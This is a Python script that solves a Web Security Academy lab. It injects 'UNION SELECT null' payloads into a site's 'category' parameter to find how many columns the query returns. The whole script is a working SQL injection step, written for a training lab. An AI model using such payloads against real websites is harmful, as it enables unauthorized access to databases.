#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 16/9/2023
#
# Lab: SQL injection UNION attack, determining the number of columns returned
#      by the query
#
# Steps: 1. Inject payload into 'category' query parameter to determine
#           the number of columns
#        2. Add one additional null column at a time
#        3. Repeat this process, increasing the number of columns until you
#           receive a valid response
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0aff00000404687c8117c57e004700c2.web-security-academy.net"

print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")

for i in range(1, 10):
    # number of nulls
    nulls = "null, " * i
    
    # payload to determine the number of columns
    payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
    
    print(Fore.WHITE + f"[*] Trying payload: {payload}")
    
    try:
        # fetch the page with the injected payload
        injection = requests.get(f"{url}/filter?category={payload}")
        
    except:
        print(Fore.RED + "[!] Failed to inject the payload to determine the number of columns through exception")
        exit(1)

    # extract the error text
    internal_error_text = re.findall("<h4>Internal Server Error</h4>", injection.text)
    
    # if the response is successful with no error text
    if len(internal_error_text) == 0:
        print(Fore.WHITE + "[#] Number of columns: " + Fore.GREEN + str(i))
        print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
        
        break
    
    else:
        continue

